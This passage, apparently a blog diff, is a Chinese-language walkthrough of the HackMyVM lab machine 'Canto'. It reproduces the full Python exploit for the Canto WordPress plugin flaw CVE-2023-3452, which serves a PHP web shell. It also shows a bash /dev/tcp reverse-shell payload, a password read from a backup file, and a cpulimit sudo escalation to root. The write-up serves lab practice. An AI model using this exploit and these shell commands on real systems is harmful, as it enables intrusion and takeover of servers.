+          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
+           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.56.181/ [192.168.56.181]
+[+] Started: Wed Jun  5 15:59:26 2024
+
+Interesting Finding(s):
+
+[+] XML-RPC seems to be enabled: http://192.168.56.181/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://192.168.56.181/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://192.168.56.181/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.56.181/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.5.3 identified (Latest, released on 2024-05-07).
+ | Found By: Atom Generator (Aggressive Detection)
+ |  - http://192.168.56.181/index.php/feed/atom/, &lt;generator uri="https://wordpress.org/" version="6.5.3">WordPress&lt;/generator>
+ | Confirmed By: Style Etag (Aggressive Detection)
+ |  - http://192.168.56.181/wp-admin/load-styles.php, Match: '</span><span class="token number">6.5</span>.3'
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Most Popular Plugins <span class="token punctuation">(</span>via Passive Methods<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No plugins Found.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK
+ <span class="token operator">|</span> Plan: <span class="token function">free</span>
+ <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">0</span>
+ <span class="token operator">|</span> Requests Remaining: <span class="token number">17</span>
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Wed Jun  <span class="token number">5</span> <span class="token number">15</span>:59:30 <span class="token number">2024</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">4</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">34</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">1.096</span> KB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">2.648</span> KB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">222.695</span> MB
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:00:03</code></pre>
+<p>没有扫到插件，很难搞，我就在想大概率是用wpscan解决不了，虽然目录开放了，但是太多目录了不太可能一个个看<br>我就尝试搜了一下Canto的的漏洞发现一个cve <code>CVE-2023-3452</code><br><img src="https://ooo.0x0.ooo/2024/06/05/OJsQMC.png" alt="OJsQMC.png" loading="lazy"><br><a href="https://github.com/leoanggal1/CVE-2023-3452-PoC/blob/main/CVE-2023-3452.py">https://github.com/leoanggal1/CVE-2023-3452-PoC/blob/main/CVE-2023-3452.py</a><br>试了一下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Exploit Title: Wordpress Plugin Canto &lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)</span>
+<span class="token comment"># Date: 04/11/2023</span>
+<span class="token comment"># Exploit Author: Leopoldo Angulo (leoanggal1)</span>
+<span class="token comment"># Vendor Homepage: https://wordpress.org/plugins/canto/</span>
+<span class="token comment"># Software Link: https://downloads.wordpress.org/plugin/canto.3.0.4.zip</span>
+<span class="token comment"># Version: All versions of Canto Plugin prior to 3.0.5</span>
+<span class="token comment"># Tested on: Ubuntu 22.04, Wordpress 6.3.2, Canto Plugin 3.0.4</span>
+<span class="token comment"># CVE : CVE-2023-3452</span>
+
+<span class="token comment">#PoC Notes:</span>
+<span class="token comment">#The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, and including, 3.0.4 via the 'wp_abspath' parameter. This allows unauthenticated attackers to include and execute arbitrary remote code on the server, provided that allow_url_include is enabled. (Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-3452)</span>
+<span class="token comment">#This code exploits the improper handling of the wp_abspath variable in the following line of the "download.php" code:</span>
+<span class="token comment">#... require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php'); ...</span>
+<span class="token comment">#This is just an example but there is this same misconfiguration in other lines of the vulnerable plugin files.</span>
+<span class="token comment"># More information in Leoanggal1's Github</span>
+
+<span class="token comment">#!/usr/bin/python3</span>
+<span class="token function">import</span> argparse
+<span class="token function">import</span> http.server
+<span class="token function">import</span> socketserver
+<span class="token function">import</span> threading
+<span class="token function">import</span> requests
+<span class="token function">import</span> os
+<span class="token function">import</span> subprocess
+
+<span class="token comment"># Define the default web shell</span>
+default_web_shell <span class="token operator">=</span> <span class="token string">"&lt;?php system(<span class="token variable">$_GET</span>['cmd']); ?>"</span>
+
+def create_admin_file<span class="token punctuation">(</span>local_dir, <span class="token assign-left variable">local_shell</span><span class="token operator">=</span>None<span class="token punctuation">)</span>:
+    <span class="token keyword">if</span> not os.path.exists<span class="token punctuation">(</span>local_dir<span class="token punctuation">)</span>:
+        os.makedirs<span class="token punctuation">(</span>local_dir<span class="token punctuation">)</span>
+
+    <span class="token comment"># If a local shell is provided, use it; otherwise, use the default web shell</span>
+    <span class="token keyword">if</span> local_shell:
+        with open<span class="token punctuation">(</span>f<span class="token string">"&#123;local_dir&#125;/admin.php"</span>, <span class="token string">"wb"</span><span class="token punctuation">)</span> as admin_file:
+            with open<span class="token punctuation">(</span>local_shell, <span class="token string">"rb"</span><span class="token punctuation">)</span> as original_file:
+                admin_file.write<span class="token punctuation">(</span>original_file.read<span class="token punctuation">(</span><span class="token punctuation">))</span>
+    else:
+        with open<span class="token punctuation">(</span>f<span class="token string">"&#123;local_dir&#125;/admin.php"</span>, <span class="token string">"w"</span><span class="token punctuation">)</span> as admin_file:
+            admin_file.write<span class="token punctuation">(</span>default_web_shell<span class="token punctuation">)</span>
+
+def start_local_server<span class="token punctuation">(</span>local_port<span class="token punctuation">)</span>:
+    Handler <span class="token operator">=</span> http.server.SimpleHTTPRequestHandler
+    httpd <span class="token operator">=</span> socketserver.TCPServer<span class="token variable"><span class="token punctuation">((</span>"<span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span>"<span class="token punctuation">,</span> local_port<span class="token punctuation">)</span><span class="token punctuation">,</span> Handler<span class="token punctuation">)</span>
+
+    print<span class="token punctuation">(</span>f"Local web server on port &#123;local_port&#125;..."<span class="token punctuation">)</span>
+    httpd.serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    return httpd
+
+def exploit_rfi<span class="token punctuation">(</span>url<span class="token punctuation">,</span> local_shell<span class="token punctuation">,</span> local_host<span class="token punctuation">,</span> local_port<span class="token punctuation">,</span> command<span class="token punctuation">,</span> nc_port<span class="token punctuation">)</span><span class="token operator">:</span>
+    local_dir <span class="token operator">=</span> "wp<span class="token operator">-</span>admin"
+    create_admin_file<span class="token punctuation">(</span>local_dir<span class="token punctuation">,</span> local_shell<span class="token punctuation">)</span>
+
+    target_url <span class="token operator">=</span> f"&#123;url&#125;<span class="token operator">/</span>wp<span class="token operator">-</span>content<span class="token operator">/</span>plugins<span class="token operator">/</span>canto<span class="token operator">/</span>includes<span class="token operator">/</span>lib<span class="token operator">/</span>download.php"
+    local_server <span class="token operator">=</span> f"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>&#123;local_host&#125;<span class="token operator">:</span>&#123;local_port&#125;"
+    command <span class="token operator">=</span> f"cmd<span class="token operator">=</span>&#123;command&#125;"
+
+    if local_shell<span class="token operator">:</span>
+        # If a local shell is provided<span class="token punctuation">,</span> start netcat on the specified port
+        subprocess.Popen<span class="token punctuation">(</span>["nc"<span class="token punctuation">,</span> "<span class="token operator">-</span>lvp"<span class="token punctuation">,</span> str<span class="token punctuation">(</span>nc_port<span class="token punctuation">)</span>]<span class="token punctuation">)</span>
+
+    server_thread <span class="token operator">=</span> threading.Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>start_local_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>local_port<span class="token punctuation">,</span><span class="token punctuation">))</span></span>
+    server_thread.daemon <span class="token operator">=</span> True
+    server_thread.start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    exploit_url <span class="token operator">=</span> f<span class="token string">"&#123;target_url&#125;?wp_abspath=&#123;local_server&#125;&amp;&#123;command&#125;"</span>
+    print<span class="token punctuation">(</span>f<span class="token string">"Exploitation URL: &#123;exploit_url&#125;"</span><span class="token punctuation">)</span>
+
+    response <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>exploit_url<span class="token punctuation">)</span>
+    print<span class="token punctuation">(</span><span class="token string">"Server response:"</span><span class="token punctuation">)</span>
+    print<span class="token punctuation">(</span>response.text<span class="token punctuation">)</span>
+
+    <span class="token comment"># Shutdown the local web server</span>
+    print<span class="token punctuation">(</span><span class="token string">"Shutting down local web server..."</span><span class="token punctuation">)</span>
+    server_thread.join<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token builtin class-name">:</span>
+    examples <span class="token operator">=</span> <span class="token string">''</span>'
+    Examples:
+    - Check the vulnerability
+    python3 CVE-2023-3452.py <span class="token parameter variable">-u</span> http://192.168.1.142 <span class="token parameter variable">-LHOST</span> <span class="token number">192.168</span>.1.33
+
+    - Execute a <span class="token builtin class-name">command</span>
+    python3 CVE-2023-3452.py <span class="token parameter variable">-u</span> http://192.168.1.142 <span class="token parameter variable">-LHOST</span> <span class="token number">192.168</span>.1.33 <span class="token parameter variable">-c</span> <span class="token string">'id'</span>
+
+    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
+    python3 CVE-2023-3452.py <span class="token parameter variable">-u</span> http://192.168.1.142 <span class="token parameter variable">-LHOST</span> <span class="token number">192.168</span>.1.33 <span class="token parameter variable">-NC_PORT</span> <span class="token number">3333</span> <span class="token parameter variable">-s</span> php-reverse-shell.php
+    <span class="token string">''</span>'
+    parser <span class="token operator">=</span> argparse.ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452"</span>, <span class="token assign-left variable">epilog</span><span class="token operator">=</span>examples, <span class="token assign-left variable">formatter_class</span><span class="token operator">=</span>argparse.RawDescriptionHelpFormatter<span class="token punctuation">)</span>
+    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-u"</span>, <span class="token string">"--url"</span>, <span class="token assign-left variable">required</span><span class="token operator">=</span>True, <span class="token assign-left variable">default</span><span class="token operator">=</span>None,  <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Vulnerable URL"</span><span class="token punctuation">)</span>
+    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-s"</span>, <span class="token string">"--shell"</span>, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Local file for web shell"</span><span class="token punctuation">)</span>
+    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-LHOST"</span>, <span class="token string">"--local_host"</span>, <span class="token assign-left variable">required</span><span class="token operator">=</span>True, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Local web server IP"</span><span class="token punctuation">)</span>
+    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-LPORT"</span>, <span class="token string">"--local_port"</span>, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Local web server port"</span><span class="token punctuation">)</span>
+    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-c"</span>, <span class="token string">"--command"</span>, <span class="token assign-left variable">default</span><span class="token operator">=</span><span class="token string">"whoami"</span>, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Command to execute on the target"</span><span class="token punctuation">)</span>
+    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-NC_PORT"</span>, <span class="token string">"--nc_port"</span>, <span class="token assign-left variable">type</span><span class="token operator">=</span>int, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Listener port for netcat"</span><span class="token punctuation">)</span>
+
+    try:
+        args <span class="token operator">=</span> parser.parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> args.local_port is None:
+            args.local_port <span class="token operator">=</span> <span class="token number">8080</span>  <span class="token comment"># Valor predeterminado si LPORT no se proporciona</span>
+        exploit_rfi<span class="token punctuation">(</span>args.url, args.shell, args.local_host, int<span class="token punctuation">(</span>args.local_port<span class="token punctuation">)</span>, args.command, args.nc_port<span class="token punctuation">)</span>
+
+    except SystemExit:
+        parser.print_help<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>检测一下</p>
+<pre class="language-none"><code class="language-none">- Check the vulnerability
+ python3 CVE-2023-3452.py -u http:&#x2F;&#x2F;192.168.1.142 -LHOST 192.168.1.33</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># python aa.py -u http://192.168.56.181 -LHOST 192.168.56.104</span>
+Local web server on port <span class="token number">8080</span><span class="token punctuation">..</span>.
+Exploitation URL: http://192.168.56.181/wp-content/plugins/canto/includes/lib/download.php?wp_abspath<span class="token operator">=</span>http://192.168.56.104:8080<span class="token operator">&amp;</span><span class="token assign-left variable">cmd</span><span class="token operator">=</span>whoami
+<span class="token number">192.168</span>.56.181 - - <span class="token punctuation">[</span>05/Jun/2024 <span class="token number">16</span>:02:41<span class="token punctuation">]</span> <span class="token string">"GET /wp-admin/admin.php HTTP/1.1"</span> <span class="token number">200</span> -
+Server response:
+www-data
+
+Shutting down <span class="token builtin class-name">local</span> web server<span class="token punctuation">..</span>.</code></pre>
+<p>发现回显了www-data，说明这个poc可用!并且给了url，去这个url看一下<br><img src="https://ooo.0x0.ooo/2024/06/05/OJsLZS.png" alt="OJsLZS.png" loading="lazy"><br>ok了，弹个shell到kali<br>开个监听</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># nc -lvnp 4567</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.</code></pre>
+<p>将url后面的cmd改成<code>bash%20-c%20&#39;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4567%20%200%3E%261&#39;</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># nc -lvnp 4567</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.181<span class="token punctuation">]</span> <span class="token number">41080</span>
+bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">781</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
+bash: no job control <span class="token keyword">in</span> this shell
+www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$ </code></pre>
+<p>拿到shell</p>
+<h2 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h2><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+<span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">12</span>
+drwxr-xr-x  <span class="token number">3</span> root root     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">14</span>:24 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">20</span> root root     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">10</span>:49 <span class="token punctuation">..</span>
+drwxr-xr--  <span class="token number">5</span> erik www-data <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">13</span>:56 erik</code></pre>
+<p>只有一个erik用户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/home/erik$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+<span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">36</span>
+drwxr-xr-- <span class="token number">5</span> erik www-data <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">13</span>:56 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">3</span> root root     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">14</span>:24 <span class="token punctuation">..</span>
+lrwxrwxrwx <span class="token number">1</span> root root        <span class="token number">9</span> May <span class="token number">12</span> <span class="token number">13</span>:56 .bash_history -<span class="token operator">></span> /dev/null
+-rw-r--r-- <span class="token number">1</span> erik erik      <span class="token number">220</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> erik erik     <span class="token number">3771</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bashrc
+drwx------ <span class="token number">2</span> erik erik     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">12</span>:21 .cache
+drwxrwxr-x <span class="token number">3</span> erik erik     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">12</span>:03 .local
+-rw-r--r-- <span class="token number">1</span> erik erik      <span class="token number">807</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .profile
+drwxrwxr-x <span class="token number">2</span> erik erik     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">17</span>:22 notes
+-rw-r----- <span class="token number">1</span> root erik       <span class="token number">33</span> May <span class="token number">12</span> <span class="token number">12</span>:22 user.txt
+www-data@canto:/home/erik$ <span class="token function">cat</span> us*
+<span class="token function">cat</span> us*
+cat: user.txt: Permission denied
+www-data@canto:/home/erik$ </code></pre>
+<p>没有权限读取user.txt，想着尝试去看看www目录有没有泄露什么数据库，用户名密码之类的<br>于是<code>cd ~</code>，却发现了很显眼的东西</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/home/erik$ <span class="token builtin class-name">cd</span> ~
+<span class="token builtin class-name">cd</span> ~
+www-data@canto:/var/www$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+<span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">20</span>
+drwxr-xr-x  <span class="token number">4</span> www-data www-data <span class="token number">4096</span> Jun  <span class="token number">5</span> 07:52 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">15</span> root     root     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">17</span>:14 <span class="token punctuation">..</span>
+-rw-------  <span class="token number">1</span> www-data www-data  <span class="token number">523</span> Jun  <span class="token number">5</span> 07:55 .bash_history
+drwx------  <span class="token number">2</span> www-data www-data <span class="token number">4096</span> Jun  <span class="token number">5</span> 07:52 .ssh
+drwxr-xr-x  <span class="token number">5</span> www-data www-data <span class="token number">4096</span> Jun  <span class="token number">5</span> 07:11 html</code></pre>
+<p>历史指令可以看，于是去看了一下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/var/www$ <span class="token function">cat</span> .bash
+<span class="token function">cat</span> .bash_history 
+<span class="token builtin class-name">cd</span> /var/wordpress
+<span class="token builtin class-name">cd</span> /var
+<span class="token builtin class-name">cd</span> /wordpress
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm
+<span class="token function">clear</span>
+<span class="token function">ls</span>
+<span class="token builtin class-name">cd</span> wordpress
+<span class="token builtin class-name">cd</span> wordpres
+<span class="token function">ls</span>
+<span class="token builtin class-name">cd</span> backups
+<span class="token function">ls</span>
+<span class="token function">clear</span>
+<span class="token function">ls</span>
+<span class="token function">ls</span> <span class="token parameter variable">-la</span>
+<span class="token function">unzip</span> dbbackup.zip
+<span class="token function">ls</span>
+<span class="token function">clear</span>
+<span class="token function">ls</span> <span class="token parameter variable">-la</span>
+<span class="token function">su</span> erik
+<span class="token builtin class-name">cd</span> /var/wordpress/backups
+<span class="token function">ls</span>
+<span class="token function">cat</span> <span class="token number">12052024</span>.txt
+<span class="token builtin class-name">exit</span>
+reset
+<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+<span class="token function">ls</span> <span class="token parameter variable">-al</span>
+<span class="token function">cat</span> user.txt
+<span class="token builtin class-name">cd</span> ~
+<span class="token function">ls</span> <span class="token parameter variable">-al</span></code></pre>
+<p>习惯性地看了一下这个txt文件发现了erik用户的密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/var/www$ <span class="token builtin class-name">cd</span> /var/wordpress/backups
+<span class="token builtin class-name">cd</span> /var/wordpress/backups
+www-data@canto:/var/wordpress/backups$ <span class="token function">cat</span> <span class="token number">12</span>*
+<span class="token function">cat</span> <span class="token number">12</span>*
+------------------------------------
+<span class="token operator">|</span> Users     <span class="token operator">|</span>      Password        <span class="token operator">|</span>
+------------<span class="token operator">|</span>----------------------<span class="token operator">|</span>
+<span class="token operator">|</span> erik      <span class="token operator">|</span> th1sIsTheP3ssw0rd<span class="token operator">!</span>   <span class="token operator">|</span>
+------------------------------------</code></pre>
+<p>稳了<br>ssh连接</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/var/wordpress/backups$ <span class="token function">cat</span> <span class="token number">12052024</span>.txt 
+------------------------------------
+<span class="token operator">|</span> Users     <span class="token operator">|</span>      Password        <span class="token operator">|</span>
+------------<span class="token operator">|</span>----------------------<span class="token operator">|</span>
+<span class="token operator">|</span> erik      <span class="token operator">|</span> th1sIsTheP3ssw0rd<span class="token operator">!</span>   <span class="token operator">|</span>
+------------------------------------
+www-data@canto:/var/wordpress/backups$ <span class="token function">ssh</span> erik@127.0.0.1
+erik@127.0.0.1's password: 
+Welcome to Ubuntu <span class="token number">23.10</span> <span class="token punctuation">(</span>GNU/Linux <span class="token number">6.5</span>.0-28-generic x86_64<span class="token punctuation">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Jun  <span class="token number">5</span> 08:10:40 AM UTC <span class="token number">2024</span>
+
+  System load: <span class="token number">0.04</span>              Memory usage: <span class="token number">21</span>%   Processes:       <span class="token number">128</span>
+  Usage of /:  <span class="token number">41.9</span>% of <span class="token number">8</span>.02GB   Swap usage:   <span class="token number">0</span>%    Users logged in: <span class="token number">0</span>
+
+
+<span class="token number">0</span> updates can be applied immediately.
+
+
+The list of available updates is <span class="token function">more</span> than a week old.
+To check <span class="token keyword">for</span> new updates run: <span class="token function">sudo</span> <span class="token function">apt</span> update
+Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings
+
+
+Last login: Wed Jun  <span class="token number">5</span> 07:52:18 <span class="token number">2024</span> from <span class="token number">127.0</span>.0.1
+erik@canto:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>erik<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>erik<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>erik<span class="token punctuation">)</span></code></pre>
+<p>于是拿到user.txt</p>
+<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>习惯性地sudo一下，发现可以sudo 提权</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">erik@canto:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> erik on canto:
+    env_reset, mail_badpass,
+    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
+    use_pty
+
+User erik may run the following commands on canto:
+    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/cpulimit</code></pre>
+<p><img src="https://ooo.0x0.ooo/2024/06/05/OJsEcN.png" alt="OJsEcN.png" loading="lazy"><br>拿来主义！</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">erik@canto:~$ <span class="token function">sudo</span> cpulimit <span class="token parameter variable">-l</span> <span class="token number">100</span> <span class="token parameter variable">-f</span> /bin/sh
+Process <span class="token number">1735</span> detected
+<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+<p>拿到root权限，也拿到了root flag。<br>可惜，二血，还是太菜了，菜就多练吧。</p>
+]]></content>
+      <categories>
+        <category>HackMyVM</category>
+      </categories>
+      <tags>
+        <tag>cpulimit</tag>
+      </tags>
+  </entry>
 </search>
